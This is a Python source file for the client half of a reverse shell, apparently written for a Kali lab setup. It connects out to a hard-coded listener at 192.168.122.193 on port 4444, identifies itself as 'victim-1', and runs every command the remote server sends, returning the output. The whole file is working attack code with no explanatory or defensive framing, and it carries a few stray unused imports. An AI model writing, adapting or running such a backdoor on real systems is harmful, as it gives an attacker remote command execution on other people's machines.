import socket
import json
import subprocess
import os
import base64
import time
from pathlib import Path
from pprint import pprint

from sympy import true
from zenmapCore.BasePaths import HOME


def server_connect(ip, port):
    global connection
    connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try:
            connection.connect((ip, port))
            break
        except ConnectionRefusedError:
            time.sleep(5)

def send(data):
    json_data = json.dumps(data)
    connection.send(json_data.encode('utf-8'))

def receive():
    json_data = ''
    while True:
        try:
            json_data += connection.recv(1024).decode('utf-8')
            return json.loads(json_data)
        except ValueError:
            continue

def client_run():

    # Communication established
    send({
        "type": "hello",
        "client_id": "victim-1",
        "platform": "linux",
        "python": "3.13",
        "motd": "hello from client 👋",
        "cwd": os.getcwd()
    })
    print("======= CONNECTION DETAILS =======")
    pprint(receive())

    try:
        while True:
            # Gets current working directory
            current_dir = os.getcwd()

            # Receiving commands from server.py
            command = receive()

            # Server tells client to exit
            cmd = command["cmd"]
            if cmd.lower().strip() in {"exit", "quit"}:
                break

            # Take values with key "cmd"
            args = command["cmd"]
            args_split = command["cmd"].split()

            # Checks if command uses cd
            if args_split[0] != "cd":
                exec_res = subprocess.Popen(args_split, cwd=str(current_dir) ,stdout=subprocess.PIPE)
                stdout, stderr = exec_res.communicate()

                # Sends data back to server side
                response_data = {
                    "type": "response",
                    "response": stdout.decode('utf-8'),
                    "cwd": current_dir
                }

                send(response_data)
            else:
                if len(args_split) == 1:
                    target_path = Path.home()
                else:
                    target_path = Path(args[3:]).expanduser().resolve()

                if not target_path.exists():
                    raise FileNotFoundError(f"No such directory: {target_path}")
                if not target_path.is_dir():
                    raise NotADirectoryError(f"Not a directory: {target_path}")

                os.chdir(target_path)
                new_path = os.getcwd()

                response_data = {
                    "type": "response",
                    "response": "",
                    "cwd": new_path
                }

                send(response_data)
    except KeyboardInterrupt:
        print("\n[*] Client exiting (Ctrl+C)...")
    finally:
        try:
            connection.close()
        except Exception:
            pass


server_connect('192.168.122.193', 4444) #Replace 10.0.2.15 with your Kali IP

client_run()
